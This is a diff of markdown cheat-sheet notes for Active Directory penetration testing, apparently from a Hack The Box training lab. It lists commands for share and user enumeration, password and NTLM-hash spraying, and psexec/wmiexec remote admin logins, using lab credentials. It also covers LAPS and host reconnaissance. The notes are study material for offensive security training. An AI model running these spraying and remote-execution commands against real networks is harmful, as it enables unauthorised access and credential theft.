@@ -9,14 +9,42 @@ Finding NULL Sessions
 rpcclient -U "" -N 172.16.5.5
 ```
 
-Password policy
-```shell-session
-ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+
+Find Host and discover shares
+```bash
+Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 ```
 
+Credentialed smb share discovery
 ```shell-session
-crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
 ```
+```shell-session
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+```
+
+Credentialed directory discovery
+```shell-session
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+```
+
+
+Credentialed smb share file spidering
+```shell-session
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```
+
+Credentialed admin discovery
+```shell-session
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+```
+
+Credentialed privilege user discovery
+```shell-session
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+
+#### User and Group Discovery
 
 Generating user account list
 https://github.com/insidetrust/statistically-likely-usernames
@@ -30,6 +58,50 @@ crackmapexec smb 172.16.5.5 --users
 ```
 ```shell-session
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+Credentialed valid user discovery
+```shell-session
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+
+Discovering valid users with user list
+```shell-session
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+
+(Extract usernames)
+
+grep -oE '[^[:space:]]+@' logfile.txt | cut -d'@' -f1
+```
+
+Credentialed logged on user discovery
+```shell-session
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+```
+
+Credentialed group discovery
+```shell-session
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+
+Admin login via impacket
+```bash
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+```
+Stealthy admin login via impacket
+```bash
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+```
+
+#### Password Discovery
+
+Password policy
+```shell-session
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+```shell-session
+crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
 ```
 
 Password spraying linux
@@ -51,20 +123,14 @@ PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
 PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 
-
-Admin account hash spraying
+Admin account hash spraying host within domain
 ```shell-session
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
 
-Discovering valid users with user list
-```shell-session
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+#### Account Attributes
 
-(Extract usernames)
 
-grep -oE '[^[:space:]]+@' logfile.txt | cut -d'@' -f1
-```
 
 Get common user attributes
 ```powershell-session
@@ -81,8 +147,7 @@ Current User Privileges
 whoami /priv
 ```
 
-
-***Security Controls***
+#### Security Controls ####
 
 Check Windows Devender
 ```powershell-session
@@ -93,3 +158,43 @@ Check Whitelist applications and paths
 ```powershell-session
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
+
+Checking if in constrained mode
+```powershell-session
+$ExecutionContext.SessionState.LanguageMode
+```
+
+Show users delegated to read LAPS passwords
+```powershell-session
+Find-LAPSDelegatedGroups
+```
+
+Show host with LAPS enabled when password expires
+```powershell-session
+Get-LAPSComputers
+```
+
+Show users within extended rights
+```powershell-session
+Find-AdmPwdExtendedRights
+```
+
+## Network Information
+
+| **Networking Commands**              | **Description**                                                                                                  |
+| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
+| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
+| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
+| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
+| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
+#### Quick WMI checks
+
+|**Command**|**Description**|
+|---|---|
+|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
+|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
+|`wmic process list /format:list`|A listing of all processes on host|
+|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
+|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
+|`wmic group list /format:list`|Information about all local groups|
+|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|
